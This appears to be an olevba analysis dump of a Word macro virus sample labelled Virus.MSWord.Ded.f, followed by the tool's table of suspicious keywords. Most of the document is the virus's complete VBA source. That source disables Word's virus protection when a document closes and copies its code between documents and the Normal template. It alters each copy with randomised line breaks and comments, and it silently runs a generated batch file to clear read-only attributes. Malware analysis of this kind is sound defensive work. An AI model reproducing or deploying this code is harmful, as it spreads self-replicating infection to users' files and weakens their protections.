olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.f-2291dfb9202eb4a574f266a975e332dfd991eb52
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.f-2291dfb9202eb4a574f266a975e332dfd991eb52 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
            Private Sub _
Document_New()

       End Sub
'36,40187
              Private Sub _
Document_Close()

    On Error GoTo skam
'38,20107
      Options. _
                    VirusProtection = False

   SWL
'63,31789
   ABS99
'90,57298
skam:
'63,17424
        End Sub
'2,26292
    Private _
Sub SWL()

  Application. _
                               ShowVisualBasicEditor = False

     If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

For I = 1 To NormalTemplate.VBProject.VBComponents(1). _
    CodeModule.CountOfLines

           d = _
NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

 If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

     While _
Mid(d, Len(d) - 1, 2) = " _"

   I _
= I + 1

        d = _
Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

            Wend
'84,72455
       d = _
e(d)

    ActiveDocument. _
              VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

             End If
'36,34587
           Next _
I

        ActiveDocument. _
                                            SaveAs AddToRecentFiles:=False

           End If
'90,30988
              End Sub
'27,52955
   Private Sub ABS99()
'97,29667
           If Not NormalTemplate. _
        VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 f (NormalTemplate. _
                FullName)

  For _
I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

    d _
= ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

   If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

             While _
Mid(d, Len(d) - 1, 2) = " _"

            I = I + 1
'74,23421
             d = Left(d, Len(d) - _
1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

      Wend
'7,495034
       d = _
e(d)

  NormalTemplate. _
 VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

 End _
If

Next I
'47,13914
           NormalTemplate.Save
'82,7899
            End _
If

        End _
Sub

            Private Function e(aString) As _
String

       aString = LTrim(aString)
'26,80438
              aString = _
RTrim(aString)

         If _
aString = "Sub " & "Vc()" Then

           aString _
= "Sub " & "ViewVBCode()"

         Else
'31,18372
    If aString = "Sub " & "ViewVBCode()" Then
'45,09994
           aString _
= "Sub " & "Vc()"

   End If
'6,985104
   End If
'92,54505
   For I = 1 To _
Len(aString) - 1

           If Mid(aString, I, 1) _
= "." Then

      If Not Mid(aString, _
I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

              If Not _
Mid(aString, I + 1, 1) = Chr$(34) Then

         e _
= Left(aString, I - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

        For _
j = 1 To Int(15 * Rnd)

     e = " " & _
e

  Next j
'37,77427
             Exit Function
'4,393273
       End If
'20,96745
     End _
If

         Else
'53,82507
 If Mid(aString, I, _
1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

         If Not Mid(aString, _
I + 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

         e = Left(aString, I _
- 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

            For _
j = 1 To Int(15 * Rnd)

         e = " " & _
e

     Next j
'29,1052
      Exit Function
'76,98775
        End If
'17,76208
 End If
'43,15423
 End _
If

       Next I
'41,63005
      e _
= aString & Chr$(13) & "'" & (100 * Rnd)

     Count _
= Int(15 * Rnd)

        For _
j = 1 To Count

        e _
= " " & e

   Next j
'76,01295
          End Function
'27,8411
          Private _
Sub f(fName)

   If GetAttr(fName) And vbReadOnly Then
'95,71298
Open Dir(fName) _
& ".bat" For Append As #1

             Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

      Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

  Close _
#1

            shellResult = Shell(Dir(fName) & ".bat", vbHide)
'86,16203
End If
'27,48487
     End _
Sub

        Sub _
Vc()

      For _
aDoc = 1 To Documents.Count

     For I = _
1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

 Documents(aDoc).VBProject. _
   VBComponents(1).CodeModule.DeleteLines 1

      Next I
'49,3554
          Next aDoc
'14,7068
           For _
I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

            NormalTemplate. _
                                       VBProject.VBComponents(1).CodeModule.DeleteLines 1

      Next I
'29,4584
              Application.ShowVisualBasicEditor _
= True

              End Sub
'0,3313601
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
